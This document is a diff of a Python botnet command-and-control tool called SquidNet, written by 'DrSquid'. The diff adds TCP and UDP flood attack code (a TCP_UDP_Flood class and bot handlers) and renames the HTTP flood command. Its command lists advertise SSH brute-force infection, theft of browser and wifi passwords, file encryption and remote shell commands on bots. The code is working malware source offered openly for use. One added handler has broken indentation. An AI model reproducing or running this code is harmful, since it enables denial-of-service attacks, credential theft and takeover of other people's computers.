@@ -35,14 +35,14 @@ tar -xf {os.getcwd()}/ngrok.zip
         Allows the user to know what the arguements do as well as well as
         how to use them."""
         print("""
-  _____             _     _ _   _      _           _____  ___  
- / ____|           (_)   | | \ | |    | |         | ____|/ _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__ | | | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \| | | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | |_| |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)___/ 
-           | |                                                 
-           |_|                                                                                       
+  _____             _     _ _   _      _           _____  _____ 
+ / ____|           (_)   | | \ | |    | |         | ____|| ____|
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__  | |__  
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \ |___ \ 
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | ___) |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)____/ 
+           | |                                                  
+           |_|                                                                                                                                     
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
 
 [+] Option-Parsing Help:
@@ -206,14 +206,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _           _____  ___  
- / ____|           (_)   | | \ | |    | |         | ____|/ _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__ | | | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \| | | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | |_| |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)___/ 
-           | |                                                 
-           |_|                                                                                       
+  _____             _     _ _   _      _           _____  _____ 
+ / ____|           (_)   | | \ | |    | |         | ____|| ____|
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__  | |__  
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \ |___ \ 
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | ___) |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)____/ 
+           | |                                                  
+           |_|                                                                                                                                    
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -222,46 +222,48 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
     def usage(self):
         """This displays the list of commands on the server that can be sent to the bots."""
         print("\n[+] Commands:\n")
-        print("[+] !help                        - Displays all of the commands.")
-        print("[+] !whatsnew                    - Displays all new features.")
-        print("[+] !clear                       - Clears the output.")
+        print("[+] !help                                - Displays all of the commands.")
+        print("[+] !whatsnew                            - Displays all new features.")
+        print("[+] !clear                               - Clears the output.")
         print("\n[+] Commands for TCP Botnet:\n")
-        print("[+] !ddos [website] [delay]      - Denial Of Services the website provided.")
-        print("[+] !openfile [filename]         - Opens a file in the bot working directory.")
-        print("[+] !changedir [dir]             - Changes the working directory of the Bot.")
-        print("[+] !rmdir [folder]              - Removes a folder in the bot working directory.")
-        print("[+] !rmfile [file]               - Removes a file in the bot working directory.")
-        print("[+] !encfile [file]              - Encrypts a provided file in the bot working directory")
-        print("[+] !decfile [file]              - Decrypts a provided file in the bot working directory")
-        print("[+] !viewfilecontent [file]      - Gets the content of the files provided.")
-        print("[+] !dwnldfile [src] [file]      - Downloads a file from the internet onto the bot computer.")
-        print("[+] !mkdir [dir]                 - Makes a folder in the bot current directory.")
-        print("[+] !gotowebsite [url]           - Takes the bot to the provided website.")
-        print("[+] !mkfile [filename]           - Creates a file in the bot working directory.")
-        print("[+] !editfile [file]             - Opens a file in writing mode for the bots.")
-        print("[+] !stopedit                    - Closes file editor on bots and returns to normal.")
-        print("[+] !encdir                      - Encrypts all files in the bot working directory")
-        print("[+] !decdir                      - Decrypts all files in the bot working directory")
-        print("[+] !botcount                    - Gets the amount of connected bots.")
-        print("[+] !genscript                   - Generates the bot python script needed to connect to this server.")
-        print("[+] !stopatk                     - Stops any ongoing DDoS Attacks in the Botnet.")
-        print("[+] !changedirdesktop            - Sets the bot working directory to their Desktop.")
-        print("[+] !listdir                     - Lists some of the files in the bot working directories(recommended for small botnets)")
-        print("[+] !resettoken                  - Resets the token and changes it to a new token")
-        print("[+] !getinfo                     - Gets the OS, cwd, IP, and username of the bots.")
-        print("[+] !getip                       - Gets the IP of the bots")
-        print("[+] !getwifi                     - Obtains the wifi names and passwords of the bots(windows only)")
-        print("[+] !savefile                    - Obtains a file from the bots directory.")
-        print("[+] !genadminscript              - Generates the admin script for remote connections to this server.")
-        print("[+] !getcwd                      - Gets the bots working directory.")
-        print("[+] !getos                       - Gets the OS Of the bots.")
-        print("[+] !getpasswords                - Gets the stored browser passwords of the bots.")
-        print("[+] !rickroll                    - Rick Rolls the Bots.")
+        print("[+] !httpflood [website] [delay]         - Denial Of Services the website provided.")
+        print("[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.")
+        print("[+] !udpflood [ip] [port] [delay] [size] - Floods the target with UDP Packets.")
+        print("[+] !openfile [filename]                 - Opens a file in the bot working directory.")
+        print("[+] !changedir [dir]                     - Changes the working directory of the Bot.")
+        print("[+] !rmdir [folder]                      - Removes a folder in the bot working directory.")
+        print("[+] !rmfile [file]                       - Removes a file in the bot working directory.")
+        print("[+] !encfile [file]                      - Encrypts a provided file in the bot working directory")
+        print("[+] !decfile [file]                      - Decrypts a provided file in the bot working directory")
+        print("[+] !viewfilecontent [file]              - Gets the content of the files provided.")
+        print("[+] !dwnldfile [src] [file]              - Downloads a file from the internet onto the bot computer.")
+        print("[+] !mkdir [dir]                         - Makes a folder in the bot current directory.")
+        print("[+] !gotowebsite [url]                   - Takes the bot to the provided website.")
+        print("[+] !mkfile [filename]                   - Creates a file in the bot working directory.")
+        print("[+] !editfile [file]                     - Opens a file in writing mode for the bots.")
+        print("[+] !stopedit                            - Closes file editor on bots and returns to normal.")
+        print("[+] !encdir                              - Encrypts all files in the bot working directory")
+        print("[+] !decdir                              - Decrypts all files in the bot working directory")
+        print("[+] !botcount                            - Gets the amount of connected bots.")
+        print("[+] !genscript                           - Generates the bot python script needed to connect to this server.")
+        print("[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.")
+        print("[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.")
+        print("[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)")
+        print("[+] !resettoken                          - Resets the token and changes it to a new token")
+        print("[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.")
+        print("[+] !getip                               - Gets the IP of the bots")
+        print("[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)")
+        print("[+] !savefile                            - Obtains a file from the bots directory.")
+        print("[+] !genadminscript                      - Generates the admin script for remote connections to this server.")
+        print("[+] !getcwd                              - Gets the bots working directory.")
+        print("[+] !getos                               - Gets the OS Of the bots.")
+        print("[+] !getpasswords                        - Gets the stored browser passwords of the bots.")
+        print("[+] !rickroll                            - Rick Rolls the Bots.")
         print("\n[+] Commands for SSH Botnet:\n")
-        print("[+] !infect [ip] [user]          - Brute forces login for the provided ip and username.")
-        print("[+] !inject [file]               - Opens FTP and injects a file into an infected host.")
-        print("[+] !sshlogin [ip] [user] [pass] - Logs in the ip with the provided username and password")
-        print("[+] !listsshbots                 - Lists all SSH Bots")
+        print("[+] !infect [ip] [user]                  - Brute forces login for the provided ip and username.")
+        print("[+] !inject [file]                       - Opens FTP and injects a file into an infected host.")
+        print("[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password")
+        print("[+] !listsshbots                         - Lists all SSH Bots")
         print("\n[+] Any other commands will be made into cmd commands.\n")
     def configure_adminfile(self):
         """Creates a file with the admin username and the password.
@@ -335,45 +337,47 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         self.savefile = False
         self.welcomemsg = """
 [(SERVER)]: List of Commands:
-[+] !help                        - Displays this message.
+[+] !help                                - Displays this message.
 
 [+] Commands for TCP Botnet:
 
-[+] !ddos [website] [delay]      - Denial Of Services the website provided.
-[+] !openfile [filename]         - Opens a file in the bot working directory.
-[+] !changedir [dir]             - Changes the working directory of the Bot.
-[+] !rmdir [folder]              - Removes a folder in the bot working directory.
-[+] !rmfile [file]               - Removes a file in the bot working directory.
-[+] !encfile [file]              - Encrypts a provided file in the bot working directory
-[+] !decfile [file]              - Decrypts a provided file in the bot working directory
-[+] !viewfilecontent [file]      - Gets the content of the files provided.
-[+] !dwnldfile [src] [file]      - Downloads a file from the internet onto the bot computer.
-[+] !mkdir [dir]                 - Makes a folder in the bot current directory.
-[+] !gotowebsite [url]           - Takes the bot to the provided website.
-[+] !mkfile [filename]           - Creates a file in the bot working directory.
-[+] !editfile [file]             - Opens a file in writing mode for the bots.
-[+] !stopedit                    - Closes file editor on bots and returns to normal.
-[+] !encdir                      - Encrypts all files in the bot working directory
-[+] !decdir                      - Decrypts all files in the bot working directory
-[+] !botcount                    - Gets the amount of connected bots.
-[+] !stopatk                     - Stops any ongoing DDoS Attacks in the Botnet.
-[+] !changedirdesktop            - Sets the bot working directory to their Desktop.
-[+] !listdir                     - Lists some of the files in the bot working directories(recommended for small botnets)
-[+] !resettoken                  - Resets the token and changes it to a new token
-[+] !getinfo                     - Gets the OS, cwd, IP, and username of the bots.
-[+] !getip                       - Gets the IP of the bots
-[+] !getwifi                     - Obtains the wifi names and passwords of the bots(windows only)
-[+] !savefile                    - Obtains a file from the bots directory.
-[+] !getcwd                      - Gets the bots working directory.
-[+] !getos                       - Gets the OS Of the bots.
-[+] !getpasswords                - Gets the stored browser passwords of the bots.
-[+] !rickroll                    - Rick Rolls the Bots.     
+[+] !httpflood [website] [delay]         - Denial Of Services the website provided.
+[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.
+[+] !udpflood [ip] [port] [delay] [size] - Floods the target with UDP Packets.
+[+] !openfile [filename]                 - Opens a file in the bot working directory.
+[+] !changedir [dir]                     - Changes the working directory of the Bot.
+[+] !rmdir [folder]                      - Removes a folder in the bot working directory.
+[+] !rmfile [file]                       - Removes a file in the bot working directory.
+[+] !encfile [file]                      - Encrypts a provided file in the bot working directory
+[+] !decfile [file]                      - Decrypts a provided file in the bot working directory
+[+] !viewfilecontent [file]              - Gets the content of the files provided.
+[+] !dwnldfile [src] [file]              - Downloads a file from the internet onto the bot computer.
+[+] !mkdir [dir]                         - Makes a folder in the bot current directory.
+[+] !gotowebsite [url]                   - Takes the bot to the provided website.
+[+] !mkfile [filename]                   - Creates a file in the bot working directory.
+[+] !editfile [file]                     - Opens a file in writing mode for the bots.
+[+] !stopedit                            - Closes file editor on bots and returns to normal.
+[+] !encdir                              - Encrypts all files in the bot working directory
+[+] !decdir                              - Decrypts all files in the bot working directory
+[+] !botcount                            - Gets the amount of connected bots.
+[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.
+[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.
+[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)
+[+] !resettoken                          - Resets the token and changes it to a new token
+[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.
+[+] !getip                               - Gets the IP of the bots
+[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)
+[+] !savefile                            - Obtains a file from the bots directory.
+[+] !getcwd                              - Gets the bots working directory.
+[+] !getos                               - Gets the OS Of the bots.
+[+] !getpasswords                        - Gets the stored browser passwords of the bots.
+[+] !rickroll                            - Rick Rolls the Bots.     
 
 [+] Commands for SSH Botnet:
 
-[+] !infect [ip] [user]          - Brute forces login for provided ip and username
-[+] !sshlogin [ip] [user] [pass] - Logs in the ip with the provided username and password
-[+] !listsshbots                 - Lists all SSH Bots
+[+] !infect [ip] [user]                  - Brute forces login for provided ip and username
+[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password
+[+] !listsshbots                         - Lists all SSH Bots
 
 [+] Any other commands will be made into cmd commands.
         """
@@ -441,18 +445,50 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                                 c.close()
                                 break
                     if admin:
-                        if msg.startswith('!ddos'):
+                        if msg.startswith('!httpflood'):
                             msgtobot = msg.split()
                             try:
                                 targ_website = msgtobot[1]
                                 atk_delay = msgtobot[2]
-                                servmsg = f"[({hostname})] Beginning DDoS Attack on {targ_website} with delay of {atk_delay}.\n"
+                                servmsg = f"[({hostname})] Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.\n"
                                 self.log("\n" + servmsg)
                                 print(servmsg)
                                 c.send(
-                                    f"Successfully started a DDoS Attack on {targ_website} wth a delay of {atk_delay}".encode())
+                                    f"Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Successfully started a DDoS Attack on {targ_website} wth a delay of {atk_delay}")
+                                    f"[(SERVER)---->({hostname})]: Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}")
+                            except:
+                                msg = "help"
+                                c.send("Invalid Parameters!".encode())
+                                self.log(
+                                    f"[(SERVER)---->({hostname})]: Invalid Parameters!")
+                        elif msg.startswith('!tcpflood'):
+                            msgtobot = msg.split()
+                            try:
+                                target = msgtobot[1]
+                                servmsg = f"[({hostname})] Beginning TCP Flood Attack on {target}.\n"
+                                self.log("\n" + servmsg)
+                                print(servmsg)
+                                c.send(
+                                    f"Successfully started a TCP Flood Attack on {target}".encode())
+                                self.log(
+                                    f"[(SERVER)---->({hostname})]: Successfully started a TCP Flood Attack on {target}")
+                            except:
+                                msg = "help"
+                                c.send("Invalid Parameters!".encode())
+                                self.log(
+                                    f"[(SERVER)---->({hostname})]: Invalid Parameters!")
+                        elif msg.startswith('!udpflood'):
+                            msgtobot = msg.split()
+                            try:
+                                target = msgtobot[1]
+                                servmsg = f"[({hostname})] Beginning UDP Flood Attack on {target}.\n"
+                                self.log("\n" + servmsg)
+                                print(servmsg)
+                                c.send(
+                                    f"Successfully started a UDP Flood Attack on {target}".encode())
+                                self.log(
+                                    f"[(SERVER)---->({hostname})]: Successfully started a UDP Flood Attack on {target}")
                             except:
                                 msg = "help"
                                 c.send("Invalid Parameters!".encode())
@@ -537,7 +573,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                                 self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
             except:
                 self.log(f"\n[(ERROR)]: {hostname} seems defective.\n[(CLOSECONN)]: Closing connection....")
-                print(f"[+] {hostname} seems defective.\n[+] Closing connection....\n")
+                print(f"\n[+] {hostname} seems defective.\n[+] Closing connection....\n")
                 c.close()
                 break
     def ssh_login(self, ip, username, password):
@@ -596,7 +632,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 passw = password.strip()
-                client.connect(ip, 22, username, passw)
+                client.connect(ip, 22, username, passw, timeout=2, auth_timeout=2)
                 self.ips.append(ip)
                 self.display_bots.append(f"{username}@{ip}")
                 self.ssh_bots.append(client)
@@ -621,7 +657,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     admin.send(msgtoadmin.encode())
                 except:
                     pass
-            print(f"[?] Unable to Brute Force password for {username}@{ip}")
+            print(f"\n[?] Unable to Brute Force password for {username}@{ip}")
     def send_ssh(self, instruction):
         """Sends instructions to the SSH-Bots. The output will also be sent
         back to the Server for the admins to see."""
@@ -704,12 +740,28 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     file.close()
                     print(f"[+] File '{filename}' has been generated in dir '{os.getcwd()}'\n")
                     self.log(f"\n[(FILECREATION)]: File '{filename}' has been generated in dir '{os.getcwd()}'\n")
-                elif self.instruction.startswith("!ddos"):
+                elif self.instruction.startswith("!httpflood"):
                     msgtobot = self.instruction.split()
                     try:
                         targ_website = msgtobot[1]
                         atk_delay = msgtobot[2]
-                        print(f"[+] Beginning DDoS Attack on {targ_website} with delay of {atk_delay}.\n")
+                        print(f"[+] Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.\n")
+                    except:
+                        self.instruction = "help"
+                        print("[+] Invalid Parameters!\n")
+                elif self.instruction.startswith("!tcpflood"):
+                    msgtobot = self.instruction.split()
+                    try:
+                        target = msgtobot[1]
+                        print(f"[+] Beginning TCP Flood Attack on {target}.\n")
+                    except:
+                        self.instruction = "help"
+                        print("[+] Invalid Parameters!\n")
+                elif self.instruction.startswith("!udpflood"):
+                    msgtobot = self.instruction.split()
+                    try:
+                        target = msgtobot[1]
+                        print(f"[+] Beginning UDP Flood Attack on {target}.\n")
                     except:
                         self.instruction = "help"
                         print("[+] Invalid Parameters!\n")
@@ -765,6 +817,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] New Features In the SquidNet:
 
 [+] - Fixed Typo in Option-Parsing Message(affect-->effect).
+[+] - Added TCP Flooding
+[+] - Added UDP Flooding
 [+] - Added Bot file editing.
 [+] - Added Bot file creation.
 [+] - Optimized the code a little.
@@ -4157,6 +4211,50 @@ class DDoS:
                     break
             except:
                 pass
+class TCP_UDP_Flood:
+    def __init__(self, ip, port, delay, pkt_size):
+        self.ip = ip
+        self.port = int(port)
+        self.delay = float(delay)
+        self.pkt_size = int(pkt_size)
+        self.stop = False
+    def gen_packet(self, size):
+        return random._urandom(size)
+    def UDP_Req(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(self.gen_packet(self.pkt_size), (self.ip, self.port))
+            s.close()
+        except:
+            pass
+    def TCP_req(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.ip, self.port))
+            s.send(self.gen_packet(self.pkt_size))
+            s.close()
+        except:
+            pass
+    def Stop_Atk(self):
+        self.stop = True
+    def TCP_Flood(self):
+        while True:
+            try:
+                tcp_req = threading.Thread(target=self.TCP_req)
+                tcp_req.start()
+                if self.stop:
+                    break
+            except:
+                pass
+    def UDP_Flood(self):
+        while True:
+            try:
+                udp_req = threading.Thread(target=self.UDP_Req)
+                udp_req.start()
+                if self.stop:
+                    break
+            except:
+                pass
 class Bot:
     def __init__(self, ip, port, key):
         self.ip = ip
@@ -4455,7 +4553,7 @@ OS:       {sys.platform}
                     self.file.write(self.msg.encode())
                     self.file.close()
             else:
-                if self.msg.startswith('!ddos'):
+                if self.msg.startswith('!httpflood'):
                     msg = self.msg.split()
                     ip = msg[1]
                     delay = float(msg[2])
@@ -4463,6 +4561,14 @@ OS:       {sys.platform}
                 elif self.msg.startswith('!stopatk'):
                     try:
                         self.dos.stopatk()
+                    except:
+                        pass
+                    try:
+                        self.tcpflood.Stop_Atk()
+                    except:
+                        pass
+                    try:
+                        self.udpflood.Stop_Atk()
                     except:
                         pass
                 elif self.msg.startswith('!changedirdesktop'):
@@ -4558,6 +4664,42 @@ OS:       {sys.platform}
                         for i in range(10):
                             os.system("open https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO")
                     self.send("Just got rick rolled!".encode())
+                                elif self.msg.startswith("!tcpflood"):
+                    msg_split = self.msg.split()
+                    ip = msg_split[1]
+                    try:
+                        port = int(msg_split[2])
+                    except:
+                        port = 80
+                    try:
+                        delay = float(msg_split[3])
+                    except:
+                        delay = 0
+                    try:
+                        pkt_size = int(msg_split[4])
+                    except:
+                        pkt_size = 1024
+                    self.tcpflood = TCP_UDP_Flood(ip, port, delay, pkt_size)
+                    self.tcp_flood = threading.Thread(target=self.tcpflood.TCP_Flood)
+                    self.tcp_flood.start()
+                elif self.msg.startswith("!udpflood"):
+                    msg_split = self.msg.split()
+                    ip = msg_split[1]
+                    try:
+                        port = int(msg_split[2])
+                    except:
+                        port = 80
+                    try:
+                        delay = float(msg_split[3])
+                    except:
+                        delay = 0
+                    try:
+                        pkt_size = int(msg_split[4])
+                    except:
+                        pkt_size = 1024
+                    self.udpflood = TCP_UDP_Flood(ip, port, delay, pkt_size)
+                    self.udp_flood = threading.Thread(target=self.udpflood.UDP_Flood)
+                    self.udp_flood.start()
                 else:
                     output = os.popen(self.msg).read()
                     self.send(output)
@@ -4569,6 +4711,10 @@ key = """ + str(self.key) + """
 bot = Bot(ip, port, key)
         """
         return script
+if sys.platform == "win32":
+    os.system("cls")
+else:
+    os.system("clear")
 try:
     import paramiko
 except:
